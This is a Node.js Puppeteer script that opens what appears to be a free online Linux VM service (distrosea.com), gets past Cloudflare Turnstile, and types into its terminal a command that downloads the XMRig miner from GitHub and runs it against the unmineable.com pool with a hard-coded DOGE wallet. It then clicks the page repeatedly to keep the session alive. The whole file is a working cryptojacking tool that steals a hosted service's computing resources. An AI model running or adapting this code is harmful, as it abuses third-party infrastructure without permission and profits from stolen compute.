const { connect } = require("puppeteer-real-browser");
const proxy = require("./proxy.js");
const sleep = require("./sleep.js");

const controller = async (getUrl) => {
  console.log(getUrl);

  const { page, browser } = await connect({
    args: [
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--ignore-certificate-errors",
      "--ignore-certificate-errors-spki-list",
      "--disable-gpu",
      "--disable-infobars",
      "--window-position=0,0",
      "--ignore-certifcate-errors",
      "--ignore-certifcate-errors-spki-list",
      "--disable-speech-api", // 	Disables the Web Speech API (both speech recognition and synthesis)
      "--disable-background-networking", // Disable several subsystems which run network requests in the background. This is for use 									  // when doing network performance testing to avoid noise in the measurements. ↪
      "--disable-background-timer-throttling", // Disable task throttling of timer tasks from background pages. ↪
      "--disable-backgrounding-occluded-windows",
      "--disable-breakpad",
      "--disable-client-side-phishing-detection",
      "--disable-component-update",
      "--disable-default-apps",
      "--disable-dev-shm-usage",
      "--disable-domain-reliability",
      "--disable-extensions",
      "--disable-features=AudioServiceOutOfProcess",
      "--disable-hang-monitor",
      "--disable-ipc-flooding-protection",
      "--disable-notifications",
      "--disable-offer-store-unmasked-wallet-cards",
      "--disable-popup-blocking",
      "--disable-print-preview",
      "--disable-prompt-on-repost",
      "--disable-renderer-backgrounding",
      "--disable-setuid-sandbox",
      "--disable-sync",
      "--hide-scrollbars",
      "--ignore-gpu-blacklist",
      "--metrics-recording-only",
      "--mute-audio",
      "--no-default-browser-check",
      "--no-first-run",
      "--no-pings",
      "--no-sandbox",
      "--no-zygote",
      "--password-store=basic",
      "--use-gl=swiftshader",
      "--use-mock-keychain",
      "--incognito",
    ],
    headless: false,
    turnstile: true,
    disableXvfb: false,
    ignoreAllFlags: false,
  });

  setInterval(async () => {
    try {
      await page.screenshot({ path: "screenshot.png" });
    } catch (err) {}
  }, 500);

  try {
    await page.setRequestInterception(true);
    page.on("request", (req) => {
      const url = req.url();
      if (
        url.includes("doubleclick.net") ||
        url.includes("adservice.google.com") ||
        url.includes("googlesyndication.com")
      ) {
        req.abort();
      } else {
        req.continue();
      }
    });

    await page.goto(getUrl);
    await page.waitForSelector("body");
    await sleep(15);

    let text = "";
    text +=
      "wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz ";
    text += "&& tar -xzvf xmrig-6.22.0-linux-static-x64.tar.gz ";
    text += "&& cd xmrig-6.22.0 ";
    text += "&& chmod +x xmrig ";
    text += "&& clear ";
    text +=
      "&& ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:D9Mq2fXA4vBAqBr1zqv1F9cjViw5qF43iW.pc1#rup9-jjmz -p x";

    for (let i = 0; i < text.length; i++) {
      const char = text[i];
      if (
        char === ":" ||
        char === "&" ||
        char === "#" ||
        (char === char.toUpperCase() && char !== char.toLowerCase())
      ) {
        await page.keyboard.down("Shift");
        await page.keyboard.press(char);
        await page.keyboard.up("Shift");
      } else {
        await page.keyboard.type(char, { delay: 50 });
      }
    }
    await page.keyboard.press("Enter");

    let verificarUrl = page.url();
    while (verificarUrl.includes("distrosea.com/view")) {
      verificarUrl = page.url();
      const viewport = page.viewport();
      const centerX = viewport.width / 2;
      const centerY = viewport.height / 2;
      await page.mouse.click(centerX, centerY);
      await sleep(2);
      // return true;
    }
    console.log(page.url());
    await browser.close();
    await sleep(10);
    return false;
  } catch (error) {
    console.error(`Erro interno do servidor: ${error.message}`);
    return false;
  } finally {
    //await browser.close();
  }
};

module.exports = controller;
